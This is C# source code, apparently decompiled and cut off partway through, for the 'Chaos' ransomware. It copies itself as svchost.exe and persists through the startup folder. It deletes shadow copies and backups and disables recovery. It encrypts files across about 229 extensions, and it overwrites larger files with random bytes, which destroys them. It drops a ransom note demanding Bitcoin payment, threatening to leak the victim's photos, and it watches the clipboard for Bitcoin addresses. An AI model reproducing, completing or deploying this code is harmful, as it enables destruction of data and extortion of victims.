using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[16]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0,000015 BTC", "Bitcoin Address:  bc1q7njx7z489vx9444agzf759u4q46vfgtydzwyll", "", "dont try to do something stupid or else i will send all of your photos to your friends,family,coworkers and send the virus to them too."
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>0HM5EyDpnk/9FbyRqTZN9BlQYcgYl+NQEE9j6q6FOUO0t6bjpWHvBVF3Fr3Swx4+B73wse86MEjRZkzXcr5lGNCFss0it1aBuSjRExoi1CjHIdU6g+dVAemEd6Kt1dLg1fqy3IG2PkLWn4sP+mtAhc26y1AVlPJf39j9GqojbgU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
